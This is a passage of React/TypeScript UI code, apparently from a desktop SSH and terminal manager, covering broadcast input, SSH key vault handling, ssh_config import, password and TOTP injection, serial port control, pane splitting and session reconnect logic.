          ? `Broadcast Input custom selection updated (${updated.length} sessions).`
          : 'Broadcast Input disarmed.'
      );
      return {
        enabled: newEnabled,
        scope: 'custom',
        customSessionIds: updated,
      };
    });
  }, [getBroadcastTargetSessionIds]);

  const handleTerminalInput = useCallback(
    (id: string, data: string): void => {
      lastTxDataRef.current.set(id, data);
      const api = getWailsBindings();
      if (!api) return;

      const broadcastTargets = getBroadcastTargetSessionIds();
      if (broadcastState.enabled && broadcastTargets.includes(id) && broadcastTargets.length > 1) {
        // Multi-execution broadcast across all target sessions
        broadcastTargets.forEach((targetId) => {
          lastTxDataRef.current.set(targetId, data);
        });
        const anyApi = api as unknown as { BroadcastInput?: (sids: string[], d: string) => Promise<void> };
        if (typeof anyApi.BroadcastInput === 'function') {
          void anyApi.BroadcastInput(broadcastTargets, data);
        } else {
          broadcastTargets.forEach((targetId) => {
            void api.WriteTerminal(targetId, data);
          });
        }
      } else {
        void api.WriteTerminal(id, data);
      }
    },
    [broadcastState.enabled, getBroadcastTargetSessionIds]
  );

  const handleTerminalResize = useCallback((id: string, cols: number, rows: number): void => {
    const api = getWailsBindings();
    if (api) {
      void api.ResizeTerminal(id, cols, rows);
    }
  }, []);

  const handleFontSizeChange = useCallback((szId: string, sz: number): void => {
    setPaneFontSizes((prev) => new Map(prev.set(szId, sz)));
  }, []);

  const handleGenerateKey = async (e: React.FormEvent): Promise<void> => {
    e.preventDefault();
    setModalError('');
    const label = keyLabel.trim() || `${keyType}-key`;
    const api = getWailsBindings();
    if (api?.GenerateSSHKey) {
      try {
        await api.GenerateSSHKey(label, keyType, keyPassphrase);
        await refreshVaultState();
        setKeyLabel('');
        setKeyPassphrase('');
        setStatusMessage(`Generated ${keyType.toUpperCase()} keypair "${label}" in Vault.`);
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setModalError(`Key generation failed: ${msg}`);
      }
      return;
    }
    const mockKey: SshKeySummary = {
      id: `key-${Date.now()}`,
      label,
      type: keyType,
      publicKey: `ssh-${keyType} AAAAC3NzaC1lZDI1NTE5AAAAIMockKeyData ${label}`,
      fingerprint: 'SHA256:MockFingerprintKeychainF04',
    };
    setVaultSummary((prev) => ({
      ...prev,
      keys: [...(prev.keys || []), mockKey],
    }));
    setKeyLabel('');
    setKeyPassphrase('');
  };

  const handleImportKey = async (e: React.FormEvent): Promise<void> => {
    e.preventDefault();
    setModalError('');
    const label = keyLabel.trim() || 'imported-key';
    const api = getWailsBindings();
    if (api?.ImportSSHKey) {
      try {
        await api.ImportSSHKey(label, importKeyRaw, keyPassphrase);
        await refreshVaultState();
        setKeyLabel('');
        setImportKeyRaw('');
        setKeyPassphrase('');
        setStatusMessage(`Imported SSH key "${label}" into Vault.`);
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setModalError(`Key import failed: ${msg}`);
      }
      return;
    }
    const isPPK = importKeyRaw.includes('PuTTY-User-Key-File-');
    const mockKey: SshKeySummary = {
      id: `key-${Date.now()}`,
      label,
      type: isPPK ? 'ed25519 (ppk)' : 'ed25519',
      publicKey: `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIImportedKey ${label}`,
      fingerprint: 'SHA256:ImportedKeyFingerprintF04',
    };
    setVaultSummary((prev) => ({
      ...prev,
      keys: [...(prev.keys || []), mockKey],
    }));
    setKeyLabel('');
    setImportKeyRaw('');
    setKeyPassphrase('');
  };

  const handleCopyPublicKey = async (pubKey: string, label: string): Promise<void> => {
    try {
      if (navigator.clipboard?.writeText) {
        await navigator.clipboard.writeText(pubKey);
      }
    } catch {
      // Fallback if clipboard API restricted in test environment
    }
    setStatusMessage(`Copied public key for "${label}" to clipboard.`);
  };

  const handleImportSSHConfig = async (e: React.FormEvent): Promise<void> => {
    e.preventDefault();
    setModalError('');
    const api = getWailsBindings();
    if (api?.ImportSSHConfig) {
      try {
        const res = await api.ImportSSHConfig(sshConfigText);
        setSshConfigResult(res);
        await refreshVaultState();
        setStatusMessage(`Imported ${res.entries.length} host(s) from ssh_config.`);
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setModalError(`ssh_config import failed: ${msg}`);
      }
      return;
    }
    // Local parser fallback for preview / Vitest (F-22)
    const lines = sshConfigText.split('\n');
    const entries: SSHConfigHostEntry[] = [];
    const warnings: string[] = [];
    let curr: SSHConfigHostEntry | null = null;
    lines.forEach((raw, idx) => {
      const line = raw.replace(/#.*$/, '').trim();
      if (!line) return;
      const parts = line.split(/\s+/);
      const k = parts[0].toLowerCase();
      const v = parts.slice(1).join(' ');
      if (k === 'host') {
        if (curr && !curr.hostAlias.includes('*')) entries.push(curr);
        curr = {
          hostAlias: v,
          hostName: v,
          user: 'root',
          port: 22,
          identityFile: '',
          proxyJump: [],
        };
      } else if (curr) {
        if (k === 'hostname') curr.hostName = v;
        else if (k === 'user') curr.user = v;
        else if (k === 'port') curr.port = Number(v) || 22;
        else if (k === 'identityfile') curr.identityFile = v;
        else if (k === 'proxyjump') curr.proxyJump = v.split(',').map((s) => s.trim());
        else warnings.push(`Line ${idx + 1}: unsupported directive "${parts[0]}"`);
      }
    });
    if (curr && !(curr as SSHConfigHostEntry).hostAlias.includes('*')) {
      entries.push(curr);
    }
    setSshConfigResult({ entries, warnings });
    setVaultSummary((prev) => ({
      ...prev,
      hosts: [
        ...prev.hosts,
        ...entries.map((en, i) => ({
          id: `host-cfg-${Date.now()}-${i}`,
          label: en.hostAlias,
          address: en.hostName,
          effectivePort: en.port,
          effectiveUser: en.user,
          keepaliveSecs: 30,
          groupId: '',
          identityId: '',
          tags: ['ssh_config'],
          color: '',
          favorite: false,
        })),
      ],
    }));
  };

  const handleInjectPassword = async (): Promise<void> => {
    if (!sessionId) {
      return;
    }
    const api = getWailsBindings();
    if (!api?.InjectSessionPassword) {
      setStatusMessage('Password injected into active terminal session (no newline).');
      focusersRef.current.get(sessionId)?.();
      return;
    }
    try {
      await api.InjectSessionPassword(sessionId);
      setStatusMessage('Password injected into active terminal session (no newline).');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setStatusMessage(`Password injection failed: ${msg}`);
    } finally {
      focusersRef.current.get(sessionId)?.();
    }
  };

  const handleInjectTotp = async (totpId = ''): Promise<void> => {
    if (!sessionId) {
      setStatusMessage('No active terminal session to inject 2FA code into.');
      return;
    }
    const api = getWailsBindings();
    if (!api?.InjectTotpCode) {
      setStatusMessage('TOTP 2FA code injected into active terminal session (mock mode).');
      focusersRef.current.get(sessionId)?.();
      return;
    }
    try {
      await api.InjectTotpCode(sessionId, totpId);
      setStatusMessage('TOTP 2FA code injected into active terminal prompt.');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      setStatusMessage(`2FA injection: ${msg}`);
      // Open TOTP manager modal so user can choose or configure an authenticator
      setShowTotpModal(true);
    } finally {
      focusersRef.current.get(sessionId)?.();
    }
  };

  const handleTerminalTotpClick = async (): Promise<void> => {
    let tokens = vaultSummary.totpRecords || [];
    const api = getWailsBindings();
    if (api?.ListTotpRecords) {
      try {
        const live = await api.ListTotpRecords();
        if (Array.isArray(live)) {
          tokens = live;
        }
      } catch {
        // fallback
      }
    }
    setTotpTokensList(tokens);
    if (tokens.length === 0) {
      setShowTotpModal(true);
      return;
    }
    if (tokens.length === 1) {
      await handleInjectTotp(tokens[0].id);
      return;
    }
    setShowTotpQuickSelector(true);
  };

  const handleOpenLocalTerminal = async (shellType: string): Promise<void> => {
    const api = getWailsBindings();
    let sid = `local-${shellType}-${Date.now()}`;
    if (api?.OpenLocalTerminal) {
      try {
        sid = await api.OpenLocalTerminal(shellType, { cols: 120, rows: 34 });
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Failed to launch ${shellType}: ${msg}`);
        return;
      }
    }
    const title =
      remoteExecContext.mode === 'agent' && remoteExecContext.activeAgent
        ? `Agent (${remoteExecContext.activeAgent.hostname || remoteExecContext.activeAgent.label})`
        : shellType === 'cmd'
          ? 'Local (CMD)'
          : shellType === 'wsl'
            ? 'Local (WSL)'
            : 'Local (PowerShell)';
    openSessionTab(sid, title, undefined, '#10b981');
    setStatusMessage(`Started ${title} session.`);
  };

  const handleAttachRemoteAgent = async (sshSessionId: string, label: string): Promise<void> => {
    const api = getWailsBindings();
    if (!api?.AttachRemoteAgent) return;
    setAttachingAgentSessionId(sshSessionId);
    setStatusMessage(`Deploying ephemeral companion agent to ${label}...`);
    try {
      const info = await api.AttachRemoteAgent(sshSessionId, label);
      setStatusMessage(
        `Remote Companion Agent active on ${info.hostname}${info.primaryIp ? ` (${info.primaryIp})` : ''}.`
      );
      await syncContextDependentState();
    } catch (err: unknown) {
      setStatusMessage(`Failed to attach remote agent: ${err instanceof Error ? err.message : String(err)}`);
    } finally {
      setAttachingAgentSessionId(null);
    }
  };

  const handleSelectExecContext = async (sshSessionId: string): Promise<void> => {
    const api = getWailsBindings();
    if (!api?.SetActiveExecutionContext) return;
    try {
      const ctx = await api.SetActiveExecutionContext(sshSessionId);
      setRemoteExecContext(ctx);
      setStatusMessage(
        ctx.mode === 'agent' && ctx.activeAgent
          ? `Execution context switched to ${ctx.activeAgent.hostname}.`
          : 'Execution context switched to Local Workstation.'
      );
      await syncContextDependentState();
    } catch (err: unknown) {
      setStatusMessage(`Failed to switch context: ${err instanceof Error ? err.message : String(err)}`);
    }
  };

  const handleDetachRemoteAgent = async (sshSessionId: string): Promise<void> => {
    const api = getWailsBindings();
    if (!api?.DetachRemoteAgent) return;
    try {
      const ctx = await api.DetachRemoteAgent(sshSessionId);
      setRemoteExecContext(ctx);
      setStatusMessage('Remote companion agent detached and cleaned up.');
      await syncContextDependentState();
    } catch (err: unknown) {
      setStatusMessage(`Failed to detach remote agent: ${err instanceof Error ? err.message : String(err)}`);
    }
  };

  const handleOpenRemoteAgentShell = async (workingDir = ''): Promise<void> => {
    const api = getWailsBindings();
    if (!api?.OpenRemoteAgentTerminal) return;
    try {
      const sid = await api.OpenRemoteAgentTerminal(workingDir, { cols: 120, rows: 34 });
      const hostName = remoteExecContext.activeAgent?.hostname || 'Remote';
      const title = workingDir ? `${hostName}:${workingDir.split('/').pop() || '/'}` : `Agent (${hostName})`;
      openSessionTab(sid, title, undefined, '#10b981');
      setStatusMessage(`Opened remote shell on ${hostName}${workingDir ? ` in ${workingDir}` : ''}.`);
    } catch (err: unknown) {
      setStatusMessage(`Failed to open remote shell: ${err instanceof Error ? err.message : String(err)}`);
    }
  };

  const handleRefreshSerialPorts = async (): Promise<void> => {
    setSerialLoading(true);
    const api = getWailsBindings();
    if (api?.ListSerialPorts) {
      try {
        const ports = await api.ListSerialPorts();
        setSerialPorts(ports);
        if (ports.length > 0) {
          const active = ports.find((p) => p.isConnected);
          if (!ports.some((p) => p.port === serialConfig.port)) {
            setSerialConfig((prev) => ({ ...prev, port: active ? active.port : ports[0].port }));
          }
        }
      } catch {
        // ignore
      }
    }
    setSerialLoading(false);
  };

  const handleAutoDetectSerial = async (): Promise<void> => {
    setSerialDetecting(true);
    setSerialDetectResult(null);
    const api = getWailsBindings();
    if (api?.AutoDetectSerial) {
      try {
        const res = await api.AutoDetectSerial(serialConfig.port);
        setSerialDetectResult(res);
        if (res.detected || res.port) {
          setSerialConfig((prev) => ({
            ...prev,
            port: res.port,
            baudRate: res.baudRate,
          }));
        }
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setModalError(`Auto detect failed: ${msg}`);
      }
    } else {
      const detectedPort = serialConfig.port || (serialPorts[0]?.port ?? 'COM1');
      setSerialConfig((prev) => ({ ...prev, port: detectedPort, baudRate: 115200 }));
      setSerialDetectResult({
        port: detectedPort,
        baudRate: 115200,
        confidence: 'Standard (Port verified ready)',
        detected: true,
        message: `Auto-detected ${detectedPort} at standard 115200 baud.`,
      });
    }
    setSerialDetecting(false);
  };

  const handleOpenSerialModal = async (): Promise<void> => {
    setModalError('');
    setShowSerialModal(true);
    await handleRefreshSerialPorts();
  };

  const handleConnectSerial = async (e: React.FormEvent): Promise<void> => {
    e.preventDefault();
    setModalError('');
    const api = getWailsBindings();
    let sid = `serial-${serialConfig.port}-${Date.now()}`;
    if (api?.ConnectSerial) {
      try {
        sid = await api.ConnectSerial(serialConfig);
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setModalError(`Failed to connect to ${serialConfig.port}: ${msg}`);
        return;
      }
    }
    const title = `Serial (${serialConfig.port} @ ${serialConfig.baudRate})`;
    openSessionTab(sid, title, undefined, '#f59e0b');
    setSerialPinStates((prev) =>
      new Map(prev).set(sid, { dtr: serialConfig.dtr, rts: serialConfig.rts })
    );
    setShowSerialModal(false);
    setStatusMessage(`Connected to ${serialConfig.port} at ${serialConfig.baudRate} baud.`);
  };

  const handleToggleDTR = async (sid: string): Promise<void> => {
    const current = serialPinStates.get(sid) || { dtr: true, rts: true };
    const nextState = !current.dtr;
    const api = getWailsBindings();
    if (api?.SetSerialDTR) {
      try {
        await api.SetSerialDTR(sid, nextState);
      } catch {
        // ignore
      }
    }
    setSerialPinStates((prev) =>
      new Map(prev).set(sid, { ...current, dtr: nextState })
    );
  };

  const handleToggleRTS = async (sid: string): Promise<void> => {
    const current = serialPinStates.get(sid) || { dtr: true, rts: true };
    const nextState = !current.rts;
    const api = getWailsBindings();
    if (api?.SetSerialRTS) {
      try {
        await api.SetSerialRTS(sid, nextState);
      } catch {
        // ignore
      }
    }
    setSerialPinStates((prev) =>
      new Map(prev).set(sid, { ...current, rts: nextState })
    );
  };

  const handleSendSerialBreak = async (sid: string): Promise<void> => {
    const api = getWailsBindings();
    if (api?.SendSerialBreak) {
      try {
        await api.SendSerialBreak(sid);
        setStatusMessage(`Sent break signal on ${sid}.`);
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Break failed: ${msg}`);
      }
    } else {
      setStatusMessage(`Sent break signal on ${sid}.`);
    }
  };

  const handleOpenNewConnectionTab = (): void => {
    tabCounterRef.current += 1;
    const seq = tabCounterRef.current;
    const tabId = `tab-launcher-${seq}`;
    const paneId = `pane-launcher-${seq}`;
    const newTab: TabItem = {
      id: tabId,
      title: 'New Connection',
      color: 'var(--accent-primary)',
      tabType: 'terminal',
      rootNode: {
        type: 'pane',
        id: paneId,
        sessionId: `launcher-sess-${seq}-${Date.now()}`,
        title: 'New Connection',
        paneType: 'launcher',
      },
      activePaneId: paneId,
    };
    setTabs((prev) => [...prev, newTab]);
    setActiveTabId(tabId);
    setStatusMessage('Opened New Connection tab.');
  };

  const handleOpenNewConnectionSplit = (
    zone: Exclude<DropZonePosition, 'center'> = 'right',
    targetPaneIdOverride?: string
  ): void => {
    tabCounterRef.current += 1;
    const seq = tabCounterRef.current;
    const newPaneId = `pane-launcher-${seq}`;
    const newLauncherPane: Extract<WorkspaceNode, { type: 'pane' }> = {
      type: 'pane',
      id: newPaneId,
      sessionId: `launcher-sess-${seq}-${Date.now()}`,
      title: 'New Connection',
      paneType: 'launcher',
    };

    if (
      !activeTab ||
      !activePane ||
      activeTab.tabType === 'notes' ||
      activeTab.tabType === 'settings' ||
      activeTab.tabType === 'sftp' ||
      activeTab.tabType === 'network-map' ||
      activeTab.tabType === 'winrm' ||
      activeTab.tabType === 'route-health' ||
      activeTab.tabType === 'api-tester' ||
      activeTab.tabType === 'hex-runner' ||
      activeTab.tabType === 'editor'
    ) {
      tabCounterRef.current += 1;
      const seqFirst = tabCounterRef.current;
      const firstPaneId = `pane-launcher-${seqFirst}`;
      const firstLauncherPane: Extract<WorkspaceNode, { type: 'pane' }> = {
        type: 'pane',
        id: firstPaneId,
        sessionId: `launcher-sess-${seqFirst}-${Date.now()}`,
        title: 'New Connection',
        paneType: 'launcher',
      };
      const direction: 'horizontal' | 'vertical' =
        zone === 'left' || zone === 'right' ? 'horizontal' : 'vertical';
      const tabId = `tab-split-launcher-${seq}`;
      const newTab: TabItem = {
        id: tabId,
        title: 'New Connection',
        color: 'var(--accent-primary)',
        tabType: 'terminal',
        rootNode: {
          type: 'split',
          id: `split-launcher-${seq}`,
          direction,
          children:
            zone === 'left' || zone === 'top'
              ? [newLauncherPane, firstLauncherPane]
              : [firstLauncherPane, newLauncherPane],
          ratios: [50, 50],
        },
        activePaneId: newPaneId,
      };
      setTabs((prev) => [...prev, newTab]);
      setActiveTabId(tabId);
      setShowAddToViewMenu(false);
      setStatusMessage(`Opened New Connection split view (${direction}).`);
      return;
    }

    const targetId = targetPaneIdOverride || activePane.id;
    setTabs((prev) =>
      prev.map((t) =>
        t.id === activeTab.id
          ? {
            ...t,
            rootNode: dockNodeInTree(t.rootNode, targetId, newLauncherPane, zone),
            activePaneId: newPaneId,
          }
          : t
      )
    );
    setShowAddToViewMenu(false);
    setStatusMessage(`Opened New Connection split (${zone}).`);
  };

  const handleSplitPane = async (direction: 'horizontal' | 'vertical'): Promise<void> => {
    if (!activeTab || !activePane || activePane.paneType === 'launcher') {
      handleOpenNewConnectionSplit(direction === 'horizontal' ? 'right' : 'bottom');
      return;
    }
    const api = getWailsBindings();
    let newSessionId = `sess-split-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
    if (api?.DuplicateSession) {
      try {
        newSessionId = await api.DuplicateSession(activePane.sessionId, { cols: 120, rows: 34 });
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Split pane connection failed: ${msg}`);
        return;
      }
    }
    tabCounterRef.current += 1;
    const newPaneId = `pane-${tabCounterRef.current}`;
    const currentPanes = collectPanes(activeTab.rootNode);
    const baseTitle =
      activeTab.title
        .replace(/\s*\([^)]*Split[^)]*\)/gi, '')
        .trim() || activeTab.title;
    const splitLabel = direction === 'horizontal' ? 'H' : 'V';
    const newPane: WorkspaceNode = {
      type: 'pane',
      id: newPaneId,
      sessionId: newSessionId,
      hostId: activeTab.hostId,
      title: `${baseTitle} (${splitLabel}-Split #${currentPanes.length + 1})`,
    };
    setTabs((prev) =>
      prev.map((t) => {
        if (t.id !== activeTab.id) {
          return t;
        }
        const updatedRoot = splitPaneInTree(t.rootNode, activePane.id, newPane, direction);
        return {
          ...t,
          rootNode: updatedRoot,
          activePaneId: newPaneId,
        };
      })
    );
    setStatusMessage(
      `Split ${direction} created (${currentPanes.length + 1} panes in ${activeTab.title}).`
    );
    setTimeout(() => focusersRef.current.get(newSessionId)?.(), 50);
  };

  const handlePinNotesSplit = (targetHostId?: string): void => {
    if (!activeTab || !activePane) {
      return;
    }
    const hostId = targetHostId || activePane.hostId || activeTab.hostId;
    const hostObj = vaultSummary.hosts.find((h) => h.id === hostId);
    const hostLabel = hostObj?.label || hostObj?.address || 'Host Notes';

    tabCounterRef.current += 1;
    const newPaneId = `pane-notes-${tabCounterRef.current}`;
    const newPane: WorkspaceNode = {
      type: 'pane',
      id: newPaneId,
      sessionId: `notes-sess-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      hostId,
      title: `Notes: ${hostLabel}`,
      paneType: 'notes',
      notesHostId: hostId,
    };

    setOpenNotesDrawerHostId(null);
    setTabs((prev) =>
      prev.map((t) => {
        if (t.id !== activeTab.id) {
          return t;
        }
        const updatedRoot = splitPaneInTree(t.rootNode, activePane.id, newPane, 'horizontal');
        return {
          ...t,
          rootNode: updatedRoot,
          activePaneId: newPaneId,
        };
      })
    );
    setStatusMessage(`Pinned notes as horizontal split view for ${hostLabel}.`);
  };

  const handleOpenTerminalDirectory = async (
    mode: 'default' | 'current' | 'root',
    splitDir: 'none' | 'horizontal' | 'vertical' = 'none'
  ): Promise<void> => {
    if (!activeTab || !activePane || activePane.paneType === 'launcher') {
      const api = getWailsBindings();
      let targetDir = '';
      if (mode === 'current') {
        const inputDir = window.prompt('Enter folder path to open terminal in (e.g. C:\\Projects or /var/www):', '');
        if (inputDir === null) {
          return;
        }
        targetDir = inputDir.trim();
      }
      if (api?.OpenTerminalWithOptions) {
        try {
          const newSessionId = await api.OpenTerminalWithOptions('', {
            mode,
            workingDir: targetDir,
            splitDir: 'none',
            size: { cols: 120, rows: 34 },
          });
          const title =
            mode === 'root'
              ? `Local Shell (Admin)${targetDir ? ` [${targetDir}]` : ''}`
              : targetDir
                ? `Local Shell [${targetDir}]`
                : 'Local Shell';
          openSessionTab(newSessionId, title, undefined);
          setStatusMessage(`Opened ${title}.`);
        } catch (err: unknown) {
          const msg = err instanceof Error ? err.message : String(err);
          setStatusMessage(`Failed to open terminal (${mode}): ${msg}`);
        }
      } else {
        void handleOpenLocalTerminal('powershell');
      }
      return;
    }
    const api = getWailsBindings();
    const currentCwd = getSessionCwd(activePane.sessionId) || activePane.cwd || '';
    const targetDir = mode === 'default' ? '' : currentCwd;

    let newSessionId = `sess-${mode}-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
    if (api?.OpenTerminalWithOptions) {
      try {
        newSessionId = await api.OpenTerminalWithOptions(activePane.sessionId, {
          mode,
          workingDir: targetDir,
          splitDir,
          size: { cols: 120, rows: 34 },
        });
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Failed to open terminal (${mode}): ${msg}`);
        return;
      }
    } else if (api?.DuplicateSession) {
      try {
        newSessionId = await api.DuplicateSession(activePane.sessionId, { cols: 120, rows: 34 });
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Duplicate session failed: ${msg}`);
        return;
      }
    }

    const baseTitle =
      activeTab.title
        .replace(/\s*\([^)]*Split[^)]*\)/gi, '')
        .replace(/\s*\([^)]*Dir[^)]*\)/gi, '')
        .replace(/\s*\([^)]*Root[^)]*\)/gi, '')
        .replace(/\s*\[[^\]]*\]/gi, '')
        .trim() || activeTab.title;

    let dirLabel = '';
    if (targetDir) {
      const parts = targetDir.split(/[/\\]/).filter(Boolean);
      dirLabel = parts.length > 0 ? parts[parts.length - 1] : targetDir;
    }

    const titleSuffix =
      mode === 'root'
        ? ` (Root${dirLabel ? `: ${dirLabel}` : ''})`
        : mode === 'current'
          ? ` [${dirLabel || 'CWD'}]`
          : ' (Default Dir)';

    if (splitDir === 'horizontal' || splitDir === 'vertical') {
      tabCounterRef.current += 1;
      const newPaneId = `pane-${tabCounterRef.current}`;
      const currentPanes = collectPanes(activeTab.rootNode);
      const splitLabel = splitDir === 'horizontal' ? 'H' : 'V';
      const newPane: WorkspaceNode = {
        type: 'pane',
        id: newPaneId,
        sessionId: newSessionId,
        hostId: activeTab.hostId,
        title: `${baseTitle} (${splitLabel}-Split #${currentPanes.length + 1})${titleSuffix}`,
        cwd: targetDir,
      };
      setTabs((prev) =>
        prev.map((t) => {
          if (t.id !== activeTab.id) {
            return t;
          }
          const updatedRoot = splitPaneInTree(t.rootNode, activePane.id, newPane, splitDir);
          return {
            ...t,
            rootNode: updatedRoot,
            activePaneId: newPaneId,
          };
        })
      );
      setStatusMessage(`Opened ${mode} terminal in split pane.`);
      setTimeout(() => focusersRef.current.get(newSessionId)?.(), 50);
    } else {
      openSessionTab(
        newSessionId,
        `${baseTitle}${titleSuffix}`,
        activeTab.hostId,
        mode === 'root' ? '#ef4444' : activeTab.color
      );
      setStatusMessage(
        mode === 'root'
          ? `Opened root terminal in current directory (${targetDir || '/'}).`
          : mode === 'current'
            ? `Opened terminal in current directory (${targetDir || '~'}).`
            : 'Opened terminal in default directory.'
      );
    }
  };

  const handleClosePane = async (tabId: string, paneId: string): Promise<void> => {
    const targetTab = tabs.find((t) => t.id === tabId);
    if (!targetTab) {
      return;
    }
    const targetPane = findPane(targetTab.rootNode, paneId);
    if (targetPane) {
      const isTerminalPane = !targetPane.paneType || targetPane.paneType === 'terminal';
      writersRef.current.delete(targetPane.sessionId);
      pendingDataBuffers.current.delete(targetPane.sessionId);
      focusersRef.current.delete(targetPane.sessionId);
      if (isTerminalPane) {
        disposeTerminal(targetPane.sessionId);
      }
      setPaneFontSizes((prev) => {
        const next = new Map(prev);
        next.delete(targetPane.sessionId);
        return next;
      });
      const rcTimer = reconnectTimersRef.current.get(paneId);
      if (rcTimer) {
        clearInterval(rcTimer);
        reconnectTimersRef.current.delete(paneId);
      }
      setReconnectStates((prev) => {
        if (!prev.has(paneId)) return prev;
        const next = new Map(prev);
        next.delete(paneId);
        return next;
      });
      const api = getWailsBindings();
      if (api && isTerminalPane) {
        intentionalDisconnectsRef.current.add(targetPane.sessionId);
        void api.DisconnectSession(targetPane.sessionId);
      }
    }
    setTabs((prev) => {
      const nextTabs: TabItem[] = [];
      for (const t of prev) {
        if (t.id !== tabId) {
          nextTabs.push(t);
          continue;
        }
        const newRoot = removePaneFromTree(t.rootNode, paneId);
        if (newRoot) {
          const remainingPanes = collectPanes(newRoot);
          const nextActiveId = remainingPanes.some((p) => p.id === t.activePaneId)
            ? t.activePaneId
            : remainingPanes[0]?.id || '';
          nextTabs.push({
            ...t,
            rootNode: newRoot,
            activePaneId: nextActiveId,
          });
        }
      }
      return nextTabs;
    });
    if (activeTabId === tabId) {
      const newRoot = removePaneFromTree(targetTab.rootNode, paneId);
      if (!newRoot) {
        const remainingTabs = tabs.filter((t) => t.id !== tabId);
        setActiveTabId(remainingTabs[0]?.id || null);
      }
    }
  };

  const handleCyclePaneFocus = (): void => {
    if (!activeTab) {
      return;
    }
    const panes = collectPanes(activeTab.rootNode);
    if (panes.length <= 1) {
      return;
    }
    const idx = panes.findIndex((p) => p.id === activeTab.activePaneId);
    const nextIdx = cycleIndexLocal(idx === -1 ? 0 : idx, panes.length, 1);
    const nextPane = panes[nextIdx];
    setTabs((prev) =>
      prev.map((t) => (t.id === activeTab.id ? { ...t, activePaneId: nextPane.id } : t))
    );
    focusersRef.current.get(nextPane.sessionId)?.();
  };

  const handleCloseTab = async (tabId: string): Promise<void> => {
    const target = tabs.find((t) => t.id === tabId);
    if (!target) {
      return;
    }
    const targetPanes = collectPanes(target.rootNode);
    const api = getWailsBindings();
    for (const p of targetPanes) {
      const isTerminalPane = !p.paneType || p.paneType === 'terminal';
      writersRef.current.delete(p.sessionId);
      pendingDataBuffers.current.delete(p.sessionId);
      focusersRef.current.delete(p.sessionId);
      if (isTerminalPane) {
        disposeTerminal(p.sessionId);
      }
      setPaneFontSizes((prev) => {
        const next = new Map(prev);
        next.delete(p.sessionId);
        return next;
      });
      const paneRcTimer = reconnectTimersRef.current.get(p.id);
      if (paneRcTimer) {
        clearInterval(paneRcTimer);
        reconnectTimersRef.current.delete(p.id);
      }
      setReconnectStates((prev) => {
        if (!prev.has(p.id)) return prev;
        const next = new Map(prev);
        next.delete(p.id);
        return next;
      });
      if (api && isTerminalPane) {
        intentionalDisconnectsRef.current.add(p.sessionId);
        void api.DisconnectSession(p.sessionId);
      }
    }
    const remaining = tabs.filter((t) => t.id !== tabId);
    setTabs(remaining);
    if (activeTabId === tabId) {
      setActiveTabId(remaining[0]?.id || null);
    }
  };

  const handleDisconnect = async (): Promise<void> => {
    if (!activeTab || !activePane) {
      return;
    }
    intentionalDisconnectsRef.current.add(activePane.sessionId);
    await handleClosePane(activeTab.id, activePane.id);
    setStatusMessage('Disconnected.');
  };

  const cancelReconnect = (paneId: string, shouldClosePane = false): void => {
    const timer = reconnectTimersRef.current.get(paneId);
    if (timer) {
      clearInterval(timer);
      reconnectTimersRef.current.delete(paneId);
    }
    const recState = reconnectStatesRef.current.get(paneId) || reconnectStates.get(paneId);
    reconnectInFlightRef.current.delete(paneId);
    setReconnectStates((prev) => {
      const next = new Map(prev);
      next.delete(paneId);
      reconnectStatesRef.current = next;
      return next;
    });
    if (recState && shouldClosePane) {
      void handleClosePane(recState.tabId, paneId);
    }
    setStatusMessage('Reconnection cancelled.');
  };

  const performReconnect = async (paneId: string): Promise<void> => {
    // Prevent duplicate parallel reconnect attempts (e.g. double-clicking Reconnect Now).
    if (reconnectInFlightRef.current.has(paneId)) {
      return;
    }
    const timer = reconnectTimersRef.current.get(paneId);
    if (timer) {
      clearInterval(timer);
      reconnectTimersRef.current.delete(paneId);
    }
    const recState = reconnectStatesRef.current.get(paneId);
    if (!recState) return;

    reconnectInFlightRef.current.add(paneId);
    const currentAttempt = recState.status === 'failed' ? 1 : recState.attempt;
    const activeState: ReconnectState = {
      ...recState,
      attempt: currentAttempt,
      status: 'reconnecting',
      countdown: 0,
    };
    setReconnectStates((prev) => {
      const next = new Map(prev);
      next.set(paneId, activeState);
      reconnectStatesRef.current = next;
      return next;
    });

    setStatusMessage(`Attempting to reconnect ${recState.title} (Attempt ${currentAttempt}/${recState.maxAttempts})...`);
    const api = getWailsBindings();
    if (!api) {
      reconnectInFlightRef.current.delete(paneId);
      return;
    }

    try {
      let newSessionId = '';
      if (recState.hostId) {
        newSessionId = await api.ConnectSavedHost(recState.hostId, { cols: 120, rows: 34 });
      } else {
        throw new Error('Host ID not available for auto-reconnect');
      }

      // If the user cancelled while the handshake was in flight, close the orphaned session.
      if (!reconnectStatesRef.current.has(paneId)) {
        void api.DisconnectSession?.(newSessionId);
        return;
      }

      setLiveSessions((prev) => new Set(prev).add(newSessionId));
      setTabs((prev) =>
        prev.map((t) => {
          if (t.id !== recState.tabId) return t;
          const replaceSessionInNode = (n: WorkspaceNode): WorkspaceNode => {
            if (n.type === 'pane') {
              if (n.id === paneId) {
                return { ...n, sessionId: newSessionId };
              }
              return n;
            }
            return { ...n, children: n.children.map(replaceSessionInNode) };
          };
          return { ...t, rootNode: replaceSessionInNode(t.rootNode) };
        })
      );

      setReconnectStates((prev) => {
        const next = new Map(prev);
        next.delete(paneId);
        reconnectStatesRef.current = next;
        return next;
      });

      setStatusMessage(`Successfully reconnected to ${recState.title}!`);
    } catch (err) {
      if (!reconnectStatesRef.current.has(paneId)) {
        return;
      }
      const errMsg = err instanceof Error ? err.message : String(err);
